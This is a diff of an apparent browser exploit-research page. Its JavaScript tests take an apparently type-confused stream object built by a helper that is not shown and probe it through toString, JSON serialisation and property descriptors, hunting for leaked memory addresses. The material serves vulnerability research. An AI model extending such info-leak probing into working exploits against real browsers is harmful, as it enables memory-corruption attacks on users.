-    captureError('Script.blob.src', function() {
-        return new Promise(function(resolve) {
-            var s = document.createElement('script');
-            s.onload = function() { resolve('script loaded'); };
-            s.onerror = function() { resolve('script error'); };
-            s.src = url;
-            document.head.appendChild(s);
-            setTimeout(function() { resolve('script timeout'); }, 2000);
-        });
-    });
-    
-    URL.revokeObjectURL(url);
     beacon('done');
 };
 
-// ===== Main Runner =====
+/* L2: Leak via toString */
+RUNS['L2'] = function() {
+    beacon('=== L2: Leak via toString ===');
+    var ts = buildFake(new ArrayBuffer(0x100));
+    if (!ts) return;
+    
+    var r = ts.readable;
+    var w = ts.writable;
+    
+    // Function toString on methods
+    ['cancel', 'getReader', 'tee', 'pipeTo', 'pipeThrough'].forEach(function(m) {
+        try {
+            var fn = r[m];
+            if (fn) beacon('readable.' + m + '.toString=' + fn.toString().slice(0,80));
+        } catch(e) { beacon('readable.' + m + '.toString 💀 ' + e.name); }
+    });
+    
+    ['abort', 'getWriter', 'close'].forEach(function(m) {
+        try {
+            var fn = w[m];
+            if (fn) beacon('writable.' + m + '.toString=' + fn.toString().slice(0,80));
+        } catch(e) { beacon('writable.' + m + '.toString 💀 ' + e.name); }
+    });
+    
+    // Object.prototype.toString on internal objects
+    try {
+        var readerProto = Object.getPrototypeOf(r);
+        beacon('readable proto toString=' + Object.prototype.toString.call(readerProto));
+        beacon('readable proto keys=' + Object.getOwnPropertyNames(readerProto).join(','));
+    } catch(e) { beacon('readable proto 💀 ' + e.name); }
+    
+    beacon('done');
+};
+
+/* L3: Leak via JSON */
+RUNS['L3'] = function() {
+    beacon('=== L3: Leak via JSON ===');
+    var ts = buildFake(new ArrayBuffer(0x100));
+    if (!ts) return;
+    
+    try { beacon('JSON.r=' + JSON.stringify(ts.readable).slice(0,100)); } catch(e) { beacon('JSON.r 💀 ' + e.name); }
+    try { beacon('JSON.w=' + JSON.stringify(ts.writable).slice(0,100)); } catch(e) { beacon('JSON.w 💀 ' + e.name); }
+    
+    // Custom replacer
+    try {
+        var seen = [];
+        var json = JSON.stringify(ts.readable, function(k, v) {
+            if (typeof v === 'object' && v !== null) {
+                if (seen.indexOf(v) !== -1) return '[Circular]';
+                seen.push(v);
+            }
+            if (typeof v === 'function') return '[Function: ' + (v.name || 'anonymous') + ']';
+            return v;
+        });
+        beacon('JSON.r(replacer)=' + json.slice(0,150));
+    } catch(e) { beacon('JSON.r(replacer) 💀 ' + e.name); }
+    
+    beacon('done');
+};
+
+/* L4: Leak via descriptors */
+RUNS['L4'] = function() {
+    beacon('=== L4: Leak via Descriptors ===');
+    var ts = buildFake(new ArrayBuffer(0x100));
+    if (!ts) return;
+    
+    function dumpDescriptors(obj, name) {
+        try {
+            var props = Object.getOwnPropertyNames(obj);
+            beacon(name + ' has ' + props.length + ' own props');
+            props.forEach(function(p) {
+                try {
+                    var d = Object.getOwnPropertyDescriptor(obj, p);
+                    var info = '';
+                    if (d.get) info += 'G';
+                    if (d.set) info += 'S';
+                    if ('value' in d) info += 'V=' + String(d.value).slice(0,30);
+                    if (d.enumerable) info += 'E';
+                    if (d.configurable) info += 'C';
+                    beacon('  ' + name + '.' + p + ' [' + info + ']');
+                } catch(e) {
+                    beacon('  ' + name + '.' + p + ' 💀 descriptor ' + e.name);
+                }
+            });
+        } catch(e) {
+            beacon(name + ' 💀 enumerate ' + e.name);
+        }
+    }
+    
+    dumpDescriptors(ts.readable, 'readable');
+    dumpDescriptors(ts.writable, 'writable');
+    dumpDescriptors(Object.getPrototypeOf(ts.readable), 'ReadableStreamProto');
+    dumpDescriptors(Object.getPrototypeOf(ts.writable), 'WritableStreamProto');
+    
+    beacon('done');
+};
+
 function run(v) {
     currentVariant = v;
     beacon('\\n>>> BOOT v=' + v + ' <<<');
-    try {
-        RUNS[v]();
-    } catch(e) {
-        beacon('💀 RUN THREW ' + e.name + ': ' + e.message);
-    }
+    try { RUNS[v](); } catch(e) { beacon('💀 RUN THREW ' + e.name + ': ' + e.message); }
 }
 
-beacon('\\n🟢 Crash Info Leak Hunt Loaded');
-beacon('If any operation crashes, check the error stack for memory addresses.');
+beacon('\\n🟢 Confused Object Surface Scan Loaded');
+beacon('Probe EVERY property on corrupted readable/writable.');
+beacon('Look for: unexpected values, hex addresses in errors, or behavior differences.');
 </script>
 </body>
 </html>
